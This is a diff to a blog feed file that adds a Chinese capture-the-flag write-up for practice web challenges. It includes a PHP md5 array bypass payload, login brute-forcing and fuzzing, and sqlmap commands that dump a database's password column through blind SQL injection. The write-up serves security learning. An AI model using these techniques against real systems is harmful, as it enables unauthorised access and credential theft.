@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>[青少年CTF]Web-CheckMe05-08 writeup</title>
+      <link href="/2022/11/28/5cafc287c46d-q1jun/"/>
+      <url>/2022/11/28/5cafc287c46d-q1jun/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01-CheckMe05"><a href="#0x01-CheckMe05" class="headerlink" title="0x01 CheckMe05"></a>0x01 CheckMe05</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">      <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">          <span class="keyword">echo</span>(<span class="variable">$flag</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强类型比较，当给md5()提供的变量为数组时，返回null，则有<code>null === null</code>，这样可以绕过强类型比较</p><p>所以最终payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128234313279.png" alt="image-20221128234313279"></p><h2 id="0x01-CheckMe06"><a href="#0x01-CheckMe06" class="headerlink" title="0x01 CheckMe06"></a>0x01 CheckMe06</h2><p>下载题目给的附件📎：list.txt</p><p>进入环境使用<code>Burpsuite</code>或者<code>yakit</code>抓包，用户名为<strong>admin</strong></p><p>爆破密码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128234842988.png" alt="image-20221128234842988"></p><p>在返回包中得到flag</p><h2 id="0x01-CheckMe07"><a href="#0x01-CheckMe07" class="headerlink" title="0x01 CheckMe07"></a>0x01 CheckMe07</h2><p>进入环境，还是登入页面。</p><p>对<code>username</code>和<code>password</code>fuzz一下直接出flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128235940478.png" alt="image-20221128235940478"></p><h2 id="0x01-CheckMe08"><a href="#0x01-CheckMe08" class="headerlink" title="0x01 CheckMe08"></a>0x01 CheckMe08</h2><blockquote><p>这题演示一下使用<code>sqlmap</code>的基本步骤</p></blockquote><p>还是那个登入页面，使用<code>burpsuite</code>抓包，右键抓的数据包选择<code>copy to file</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129000335046.png" alt="image-20221129000335046"></p><p>然后使用sqlmap，测试出这是时间盲注：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; --dbs</span><br></pre></td></tr></table></figure><blockquote><p>这题中如果看不懂英文，一路回车即可，该命令如果sqlmap测试成功，则会返回数据库名。</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001034116.png" alt="image-20221129001034116"></p><p>爆表名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql --tables</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001211512.png" alt="image-20221129001211512"></p><p>爆列名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql -T user --columns</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001611330.png" alt="image-20221129001611330"></p><p>查看<code>password</code>列的数据，拿到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql -T user -C password --dump</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129002854913.png" alt="image-20221129002854913"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> QSNCTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[华东交大第二届信息安全竞赛]Crypto-top_secret</title>
       <link href="/2022/11/26/3007e997d76a-q1jun/"/>
       <url>/2022/11/26/3007e997d76a-q1jun/</url>
@@ -331,7 +362,7 @@
     
     
     <entry>
-      <title>[青少年CTF]Web-CheckMe第1-4题</title>
+      <title>[青少年CTF]Web-CheckMe01-04 writeup</title>
       <link href="/2022/10/02/44008f7238c3-q1jun/"/>
       <url>/2022/10/02/44008f7238c3-q1jun/</url>
       
@@ -1008,11 +1039,11 @@
       
         <tags>
             
-            <tag> Java </tag>
-            
             <tag> 数据结构 </tag>
             
             <tag> 算法 </tag>
+            
+            <tag> Java </tag>
             
         </tags>
       
@@ -1037,11 +1068,11 @@
       
         <tags>
             
-            <tag> Java </tag>
-            
             <tag> 数据结构 </tag>
             
             <tag> 算法 </tag>
+            
+            <tag> Java </tag>
             
         </tags>
       
@@ -1068,9 +1099,9 @@
       
         <tags>
             
-            <tag> Python </tag>
-            
             <tag> Web </tag>
+            
+            <tag> Python </tag>
             
             <tag> bs4 </tag>
             
